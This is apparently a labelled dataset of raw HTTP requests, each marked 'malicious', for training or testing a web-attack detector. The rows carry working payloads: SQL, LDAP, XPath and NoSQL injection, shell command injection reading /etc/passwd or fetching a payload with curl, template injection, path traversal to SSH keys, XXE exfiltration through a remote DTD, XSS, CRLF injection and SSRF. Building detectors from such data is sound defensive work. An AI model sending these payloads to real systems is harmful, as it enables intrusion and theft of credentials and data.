"text","label"
"POST /submit_order?order_id=12345%0d%0a203.0.113.9 - fraudster [11/Jun/2024:20:20:20 +0900] ""POST /submit_order HTTP/1.1"" 500 1536 HTTP/1.1
Host: orders.online-retail-store.biz
Content-Type: application/json
Content-Length: 58
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: application/json
Origin: https://checkout.online-retail-store.biz
Referer: https://checkout.online-retail-store.biz/cart
Cache-Control: no-cache

{""product_id"":""9876"",""quantity"":2,""payment_method"":""credit_card""}","malicious"
"GET /shop/products.shtml?template_name=summer<!--#EXEC cmd=""uname%20-a""--> HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive","malicious"
"GET /device/info/server-03%7Chostname%20%7C%20whoami HTTP/1.1
Host: global-network-controller.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1","malicious"
"POST /user/settings HTTP/1.1
Host: devops-portal.cloudservices.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Origin: https://devops-portal.cloudservices.ai
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 67
Connection: keep-alive

user_bio=DevOps+engineer+%3C%21--%23INCLUDE+FiLe%3D%22%2Fhome%2Fuser%2Fsecret.conf%22+--%3E","malicious"
"GET /admin/run_backup_script.sh?filename=backup.tar.gz;%20ls%20-la%20/var/www HTTP/1.1
Host: secure-user-portal.net
User-Agent: curl/7.79.1
Accept-Encoding: gzip, deflate
Referer: https://secure-user-portal.net/dashboard
Connection: close","malicious"
"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: user_template=../../../../etc/passwd%00.html; sessionid=4f7d9a8ce2b4e1f3
Cache-Control: no-cache","malicious"
"PUT /api/config/get HTTP/1.1
Host: api.backup-solution.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json, text/javascript
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 44
Connection: keep-alive

{""filePath"": ""/home/user/.ssh/authorized_keys""}","malicious"
"POST /api/updateProfile HTTP/1.1
Host: clients.portal-careers.net
Content-Type: application/json
Content-Length: 155
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
X-CSRF-Token: 28a59ff7-0f27-408a-99dc-25f6f5fc1f53

{""fullname"":""Alex Smith"",""bio"":""Developer and tester"",""website"":""https://alexplorer.dev"",""statusMessage"":""AvailAble' AnD (SeLeCt UsEr)='admin'-- ""}","malicious"
"GET /blog/article/view?id=2345 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: br, gzip, deflate
Cookie: template_path=../../../../var/www/html/includes/header.php%00us-UK; session_id=gd2731jxn29v
Upgrade-Insecure-Requests: 1","malicious"
"GET /search/products?type=laptop&sort=price_asc&id=123&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users--&page=2 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Referer: https://api.cloud-data-services.ai/home
Cache-Control: max-age=0
Connection: keep-alive","malicious"
"GET /products/view?id=589 HTTP/1.1
Host: elitefitnessgear.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cookie: user_id=789; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0)#
Referer: https://elitefitnessgear.info/home","malicious"
"POST /directory/query/search HTTP/1.1
Host: identity-control-center.biz
User-Agent: Python-urllib/3.9
Accept: application/json
Content-Type: application/json
Content-Length: 88
Connection: close

{""searchFilter"": ""(&(givenName=John)(objectClass=person))(|(uid=admin)(uid=root))""}","malicious"
"POST /user/login HTTP/1.1
Host: secure-login-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Length: 59
Connection: keep-alive
Cookie: sessionid=ab12cd34ef56gh78ij90klmn

username=admin%00%01%08<script>alert(1)</script>&password=P%40ssw0rd123","malicious"
"POST /app/settings/update HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded
Cookie: session_filter=(uid=malicious%00
Content-Length: 32

setting1=on&setting2=off&mode=dark","malicious"
"GET /redir?url=https://trustedportal.me%2540evil-redirector.org/sso HTTP/1.1
Host: trustedportal.me
User-Agent: Python-urllib/3.9
Accept: */*
Referer: https://trustedportal.me/home
Connection: keep-alive","malicious"
"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Encoding: gzip, deflate, br
Referer: https://community.game-dev-forum.org/app/user/settings
Cookie: connect.sid=s%3Aj8LpRGwtwtslNxE1CnWaN_PATH_key

displayName=GamerOne&preferences%5Blayout%5D=compact&role_id=99&internal_user_status=ADMIN","malicious"
"POST /forum/post_reply HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Cache-Control: no-cache
Origin: https://community.game-dev-forum.org
X-Requested-With: XMLHttpRequest

thread=4523&username=PixelFan78&reply=%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C%2Fscript%3E&notify=yes","malicious"
"GET /api/v2/files?filename=..%c0%af..%c0%af..%c0%afvar%c0%aflog%c0%afsyslog HTTP/1.1
Host: nextgen-iot-hub.io
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Connection: keep-alive","malicious"
"GET /query/%7B%7Bself.__init__.__globals__.__builtins__.__import__('os').popen('netstat%20-an').read()%7D%7D/results HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
X-Requested-With: XMLHttpRequest
Connection: keep-alive","malicious"
"GET /search/user?login=%2A%29%28uid%3D%2A%29%29%28%7C%28email%3D*%29 HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://secure-user-portal.net/login
Connection: keep-alive","malicious"
"POST /user/search HTTP/1.1
Host: directory-access-secure.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://directory-access-secure.net/login
Content-Length: 53
Connection: keep-alive

user_id=validuser%29%28objectClass%3D*%29%26attributes%3D*","malicious"
"GET /download?src=..%c0%af..%c0%af..%c0%afvar%c0%afwww%c0%afhtml%c0%afindex.html HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US
Connection: keep-alive
Origin: https://online-retail-store.biz","malicious"
"GET /utils/get_status/mydevice%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Language: en-US,en;q=0.5
Accept-Encoding: br, gzip, deflate
Connection: keep-alive","malicious"
"GET /api/v1/search?query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: marketplace-datahub.biz
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: application/json
Connection: keep-alive","malicious"
"GET /user/profile/edit HTTP/1.1
Host: secure-user-portal.net
User-Agent: Curl/7.68.0 (cmd; touch /tmp/cmdinject.flag; ) Chromium
Accept: */*
Accept-Encoding: gzip, deflate
Referer: https://secure-user-portal.net/login
Connection: close","malicious"
"POST /api/analytics/log HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: wget/1.21.1
Accept: application/json
Content-Type: application/json
Content-Length: 255
Cache-Control: no-cache
Connection: Keep-Alive

{""visitor_ip"":""192.168.100.25"", ""page"":""/blog/article/view"", ""event_details"":""Page scroll recorded\"", \""status_code\"": 200, \""user_id\"": \""admin\"", \""is_privileged\"": true, \""original_event\"": \""scroll_event""}","malicious"
"POST /profile/edit HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Content-Length: 70

username=shopper77&preferences%5Bemail_updates%5D=yes&role_id=1&internal_user_status=ACTIVE","malicious"
"POST /api/v2/data/filter HTTP/1.1
Host: user-content-service.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Origin: https://dashboard.user-content-service.io
Referer: https://dashboard.user-content-service.io/app/query
Connection: keep-alive
Content-Length: 181

{""query"":{""$where"":""this.email === 'admin@secure-user-portal.net' && (this.pwd.slice(0,1) === 'a' || sleep(3000))""},""limit"":10}","malicious"
"GET /app/user/settings?uid=%2527%2520OR%2520%2528SELECT%2520LOAD_FILE%2528CONCAT%2528%2527%255C%255C%255C%255C%2527%252C%2528SELECT%2520version%2528%2529%2529%252C%2527.attacker-domain.com%255C%255Cdata%2527%2529%2529%2529--%2520 HTTP/1.1
Host: login.secure-user-portal.net
User-Agent: curl/7.77.0
Accept: */*
Connection: keep-alive
Cookie: login_token=8ea7c569f42e43bcbe6d3f58a3f0bb73","malicious"
"GET /fetch_remote?url=https://127.0.0.1:8443/secure/admin HTTP/1.1
Host: app-profile-manager.org
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Sec-CH-UA: "" Not A;Brand"";v=""99"", ""Chromium"";v=""92"", ""Google Chrome"";v=""92""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows""
Accept-Encoding: gzip, deflate","malicious"
"GET /settings/load?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd HTTP/1.1
Host: secure-messaging-app.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: keep-alive
Referer: https://secure-messaging-app.org/dashboard","malicious"
"POST /profile/edit HTTP/1.1
Host: media-streaming-alpha.tv
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Content-Length: 71
Cache-Control: max-age=0

bio=I%20love%20movies';db.profiles.update({user:'admin'},{$set:{access:'full'}}); //&location=NYC","malicious"
"GET /tools/network/scan?host=192.168.1.1;%20cat%20/etc/passwd HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.7
Cache-Control: no-cache","malicious"
"POST /api/user/authenticate HTTP/1.1
Host: secure-login-hub.net
Content-Type: application/json
Content-Length: 98
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
X-CSRF-Token: 4f9d3a7e-1b29-4c8a-9f0b-7d2a5c6e8f9b

{""username"":""adminUser"",""password"":""password' Or '1'='1""}","malicious"
"POST /api/search/users HTTP/1.1
Host: global-networks-directory.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/json
Content-Type: application/json
Content-Length: 92

{""searchFilter"": ""(role=analyst)(objectClass=person))(|(uid=administrator)""}","malicious"
"POST /signin HTTP/1.1
Host: urban-healthcare-services.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Referer: https://urban-healthcare-services.org/signin
Connection: keep-alive

user=patient' and substring(//users/user[1]/concat(substring(password,1,1),substring(password,5,1)),2,1)='9'&pass=password123","malicious"
"POST /app/login HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 130
Referer: https://my-personal-blog-site.info/login
Connection: keep-alive

username=guest'%20and%20substring(concat(substring(//accounts/user[1]/password,1,3),'#'),2,1)='s'&password=dummy","malicious"
"POST /auth/ldap_login HTTP/1.1
Host: secure-remote-access.io
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Accept: application/json
X-Requested-With: XMLHttpRequest
Connection: close

username=%29%28uid%3D*%29%29%7C%28memberOf%3Dadmins%29","malicious"
"GET /blog/article/view/9876%0d%0aX-Injected:HeaderValue%0d%0a%0d%0a<html><body>Injected</body></html> HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: curl/7.77.0
Accept: */*
Referer: https://my-personal-blog-site.info/blog
Connection: close","malicious"
"POST /app/lookup HTTP/1.1
Host: corporate-login.identity-fabric.shop
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US
Content-Length: 60
Connection: keep-alive

user_id=jdoe%29%28objectClass%3D*%29&attributes=%2A","malicious"
"POST /feedback/api/v4/post HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/xml
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Length: 176

<?xml version=""1.0""?>
<!DOCTYPE feedback [
<!ENTITY xxe_ssrf SYSTEM ""http://localhost:1234/admin"" >
]>
<feedback>
  <comment>&xxe_ssrf;</comment>
</feedback>","malicious"
"PATCH /users/me/profile HTTP/1.1
Host: business-app-suite.org
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYmFkYWN0b3IiLCJpc3MiOiJhcGkuYnVzaW5lc3MtYXBwLXN1aXRlLm9yZyJ9.D-glfDKMy-FJzZ6tIVoTr8XNnKVzOiuJuIaCcxSg-JM
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36
Accept-Language: en-US

{
  ""user_details"": {
    ""name"": ""attacker"",
    ""address"": ""123 evil st""
  },
  ""account_info"": {
    ""subscription_level"": ""premium"",
    ""override_settings"": {
      ""is_feature_xyz_enabled"": true,
      ""credits_override"": 99999
    }
  }
}","malicious"
"GET /api/v1/ping/endpoint%7Chostname%20%7C%20whoami HTTP/1.1
Host: remote-api-services.ai
User-Agent: curl/7.77.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close","malicious"
"GET /user/profile?category=5%27%20UNION%20SELECT%20@@VERSION%2CSLEEP%285%29%2CUSER%28%29--%20 HTTP/1.1
Host: portal.secure-user-portal.net
Connection: keep-alive
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: br, gzip, deflate
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.abc123def456; last_visit=1623456789","malicious"
"GET /cgi-bin/header.shtml?template_name=main<!--#exec cmd=""id""--> HTTP/1.1
Host: proxy-service-gateway.biz
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Accept-Language: en
Connection: close","malicious"
"GET /data/export/csv%0d%0aX-Evil-Header:%20yes%0d%0aContent-Length:%2027%0d%0a%0d%0a<script>window.location=1</script> HTTP/1.1
Host: analytics-reporting-service.ai
User-Agent: Python-urllib/3.8
Accept: */*
Referer: https://analytics-reporting-service.ai/dashboard
Cache-Control: max-age=0","malicious"
"GET /xml_api/search_books?book_title=1984%27%20or%20%271%27%3D%271-- HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache","malicious"
"GET /assets/img/logo.png HTTP/1.1
Host: marketing-media-brokerage.biz
User-Agent: Wget/1.21.1 (linux-gnu) $(date)
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Connection: keep-alive","malicious"
"GET /search/%7B%7B%20self.__init__.__globals__.__builtins__.__import__(%22os%22).popen(%22ls%20%2F%22).read()%20%7D%7D/results HTTP/1.1
Host: app-dashboard-vault.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive","malicious"
"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 148
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36

setting_id=55&update_b64=cHJvZHVjdF9pZD0xMjM7IFVQREFURSB1c2VycyBTRVQgYWRtaW49MSBXSEVSRSBpZD0xOyAtLQ==","malicious"
"POST /api/v2/user/login HTTP/1.1
Host: auth-portal.cloud-data-services.ai
User-Agent: ReportViewer/3.3; echo ""UA-Header: $(cat /etc/passwd)"" >> /var/log/us.log
Content-Type: application/json
Content-Length: 44
Accept: application/json

{""username"":""james"",""password"":""s3cret!""}","malicious"
"POST /newsletter/subscribe HTTP/1.1
Host: mailinglist.marketing-hub.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 92
User-Agent: Wget/1.21.1
Accept: */*
Pragma: no-cache
Cache-Control: no-cache

email=newuser%40inbox.mail&referrer=campaign123%0apid%0acurl%20http%3A%2F%2Fmalicious.site%2Fpayload.sh","malicious"
"GET /media/input/..%2F..%2F..%2F..%2Fhome/user/.ssh/id_rsa HTTP/1.1
Host: assets.cdn-infra.prod-corp.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive","malicious"
"POST /api/v1/extract HTTP/1.1
Host: secure-data-mine.biz
User-Agent: Python-urllib/3.9
Accept: application/xml
Content-Type: application/xml
Content-Length: 128
Referer: https://secure-data-mine.biz/tools
Connection: close

<searchRequest>
  <term>' or '1'='1' or name()='</term>
  <category>all</category>
</searchRequest>","malicious"
"GET /search?q=%26lt%3Bscript%26gt%3Balert%28%26%2339%3BXSS_%20Vulnerability_Found%26%2339%3B%29%26lt%3B%2Fscript%26gt%3B HTTP/1.1
Host: my-personal-blog-site.info
Connection: keep-alive
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Referer: https://my-personal-blog-site.info/articles
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36","malicious"
"GET /resources/imageproxy?imageUrl=https://internal-api.secure-services.local/healthcheck HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: https://my-personal-blog-site.info/gallery
Connection: close","malicious"
"POST /v2/xml/upload HTTP/1.1
Host: cloud-storage.backup-portal.ai
Content-Type: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://cloud-storage.backup-portal.ai/dashboard
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Content-Length: 266

<!DOCTYPE data [
<!ENTITY % host SYSTEM ""file:///etc/hostname"">
<!ENTITY % payload SYSTEM ""http://api-data-extract-secure.biz/malicious.dtd"">
%payload;
%sendData;
]>
<data>Secure cloud storage import.</data>","malicious"
"GET /directory_lookup?group=*)%28objectClass=organizationalUnit%29 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Cache-Control: no-cache
Pragma: no-cache","malicious"
"POST /v3/checkout/confirm HTTP/1.1
Host: secure-checkout-service.ai
Content-Type: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate, br
Origin: https://secure-checkout-service.ai
Cache-Control: no-cache
Content-Length: 61
Cookie: auth_token=v9r83snvuf9fj2iweiuw

{""continue_to"": ""https://ads.attacker-net.info/promo""}","malicious"
"POST /xml/orders/submit HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/xml
Content-Type: text/xml
Content-Length: 231
Pragma: no-cache

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE orderData [
<!ELEMENT orderData ANY >
<!ENTITY file SYSTEM ""file:///etc/passwd"" >]>
<orderData>
  <orderNumber>67890</orderNumber>
  <orderInfo>&file;</orderInfo>
</orderData>","malicious"
"POST /account/preferences HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/x-www-form-urlencoded,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 312

pref_b64=TzoyNzoiQnVuZ2xlc3NcXEhvc3RUcmFja2VyIjoxOntzOjQ6ImRhdGEiO3M6NToic3RyZW5nIjtzOjI4OiJMPjpTYXNzYXJlY2hcdFNlcXVlbmNlIjtzOjY6ImNsYXNzIjtzOjI6IjQ6MTkiO319&save=true","malicious"
